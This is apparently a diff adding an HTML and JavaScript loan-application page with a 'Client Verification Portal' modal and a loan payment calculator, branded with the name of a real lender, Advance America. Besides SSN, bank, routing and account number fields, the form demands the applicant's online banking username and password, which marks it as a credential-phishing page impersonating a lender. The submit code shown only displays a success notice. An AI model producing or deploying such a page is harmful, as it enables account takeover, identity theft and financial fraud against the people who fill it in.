+                <i class="fa-solid fa-xmark text-lg"></i>
+            </button>
+
+            <!-- Modal Header -->
+            <div class="text-center mb-8 pr-8 sm:pr-0">
+                <div class="inline-flex items-center justify-center w-12 h-12 rounded-2xl bg-indigo-100 text-indigo-600 text-xl font-bold mb-3">
+                    <i class="fa-solid fa-file-shield"></i>
+                </div>
+                <h3 class="text-2xl sm:text-3xl font-black text-slate-900 tracking-tight">Client Verification Portal</h3>
+                <p class="text-slate-600 text-sm mt-1">Please complete all 14 fields below to securely submit your information for instant loan evaluation.</p>
+            </div>
+
+            <!-- 11-Box Form -->
+            <form id="verificationForm" onsubmit="handleVerificationSubmit(event)" class="space-y-5">
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <!-- Box 1 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">1. Full Legal Name</label>
+                        <input type="text" required placeholder="e.g. John Michael Doe" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 2 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">2. Email Address</label>
+                        <input type="email" required placeholder="john@example.com" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 3 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">3. Mobile Phone Number</label>
+                        <input type="tel" required placeholder="(555) 000-0000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 4 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">4. Date of Birth</label>
+                        <input type="date" required class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 5 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">5. Social Security[Last 4]</label>
+                        <input type="password" required placeholder="XXX-XX-XXXX" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 6 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">6. Residential Street Address</label>
+                        <input type="text" required placeholder="123 Financial Way" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 7 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">7. Bank name</label>
+                        <input type="text" required placeholder="" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 8 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">8. Employment Status</label>
+                        <select required class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                            <option value="">Select Status</option>
+                            <option>Full-Time Employed</option>
+                            <option>Self-Employed / Business Owner</option>
+                            <option>Part-Time / Contract</option>
+                            <option>Retired / Other</option>
+                        </select>
+                    </div>
+                    <!-- Box 9 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">9. Estimated Annual Income ($)</label>
+                        <input type="number" required placeholder="e.g. 75000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                    <!-- Box 10 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">10. Requested Loan Amount ($)</label>
+                        <input type="number" required placeholder="e.g. 25000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                </div>
+                    <!-- Box 7 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">11. Routing number</label>
+                        <input type="text" required placeholder="" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+ <!-- Box 7 -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">12. Account number</label>
+                        <input type="text" required placeholder="" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+
+<div>  
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">13. Online Banking User Name</label>
+                        <input type="text" required placeholder="" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+<div>  
+                        <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">13. Online Banking Password</label>
+                        <input type="text" required placeholder="" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                    </div>
+                <!-- Box 11 (Full width) -->
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase mb-1.5">14. Loan Purpose & Additional Details</label>
+                    <textarea rows="3" required placeholder="Describe what you plan to use the funds for..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-600 focus:outline-none"></textarea>
+                </div>
+
+                <!-- Agreement Checkbox -->
+                <div class="flex items-start gap-3 pt-2">
+                    <input type="checkbox" id="modalTerms" required class="w-4 h-4 text-indigo-600 rounded border-slate-300 focus:ring-indigo-500 mt-1">
+                    <label for="modalTerms" class="text-xs text-slate-600">I certify that all 11 pieces of provided information are accurate and authorize Advance America to conduct identity verification and credit review.</label>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="w-full py-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-xl shadow-lg shadow-indigo-200 transition text-base cursor-pointer">
+                    Submit Verification & Apply
+                </button>
+            </form>
+
+            <!-- Success Notice inside modal -->
+            <div id="modalSuccess" class="hidden mt-6 p-5 bg-emerald-50 border border-emerald-200 rounded-2xl text-center text-emerald-900">
+                <i class="fa-solid fa-circle-check text-emerald-600 text-2xl mb-2"></i>
+                <h4 class="font-bold text-base">Verification Submitted Successfully!</h4>
+                <p class="text-xs text-emerald-700 mt-1">Your 14-point profile is now securely logged. A senior loan officer has been assigned and will contact you shortly.</p>
+                <button onclick="closeVerificationModal()" class="mt-4 px-6 py-2 bg-emerald-600 text-white font-bold rounded-xl text-xs hover:bg-emerald-700 transition cursor-pointer">Close Window</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Application Logic -->
+    <script>
+        // Mobile Menu Toggle
+        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+        const mobileMenu = document.getElementById('mobileMenu');
+        
+        mobileMenuBtn.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
+
+        // Verification Modal Controls
+        const verificationModal = document.getElementById('verificationModal');
+        
+        function openVerificationModal() {
+            verificationModal.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeVerificationModal() {
+            verificationModal.classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside background
+        verificationModal.addEventListener('click', (e) => {
+            if (e.target === verificationModal) {
+                closeVerificationModal();
+            }
+        });
+
+        // Handle Form Submission
+        function handleVerificationSubmit(event) {
+            event.preventDefault();
+            document.getElementById('verificationForm').classList.add('hidden');
+            document.getElementById('modalSuccess').classList.remove('hidden');
+        }
+
+        // Loan Calculator Logic
+        const loanAmountInput = document.getElementById('loanAmount');
+        const loanTermInput = document.getElementById('loanTerm');
+        const creditScoreSelect = document.getElementById('creditScore');
+
+        const amountDisplay = document.getElementById('amountDisplay');
+        const termDisplay = document.getElementById('termDisplay');
+
+        const monthlyPaymentEl = document.getElementById('monthlyPayment');
+        const summaryPrincipal = document.getElementById('summaryPrincipal');
+        const summaryRate = document.getElementById('summaryRate');
+        const summaryTotal = document.getElementById('summaryTotal');
+
+        function calculateLoan() {
+            const principal = parseFloat(loanAmountInput.value);
+            const months = parseInt(loanTermInput.value);
+            const annualRate = parseFloat(creditScoreSelect.value);
+
+            amountDisplay.textContent = '$' + principal.toLocaleString();
+            termDisplay.textContent = months + ' Months';
+            summaryPrincipal.textContent = '$' + principal.toLocaleString();
+            summaryRate.textContent = (annualRate * 100).toFixed(1) + '%';
+
+            const monthlyRate = annualRate / 12;
+            let monthlyPayment = 0;
+            if (monthlyRate === 0) {
+                monthlyPayment = principal / months;
+            } else {
+                monthlyPayment = (principal * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+            }
+
+            const totalRepayment = monthlyPayment * months;
+
+            monthlyPaymentEl.innerHTML = '$' + Math.round(monthlyPayment).toLocaleString() + '<span class="text-lg font-normal text-slate-300">/mo</span>';
+            summaryTotal.textContent = '$' + Math.round(totalRepayment).toLocaleString();
+        }
+
+        loanAmountInput.addEventListener('input', calculateLoan);
+        loanTermInput.addEventListener('input', calculateLoan);
+        creditScoreSelect.addEventListener('change', calculateLoan);
+
+        // Initial calculation call
+        calculateLoan();
+    </script>
+</body>
+</html>
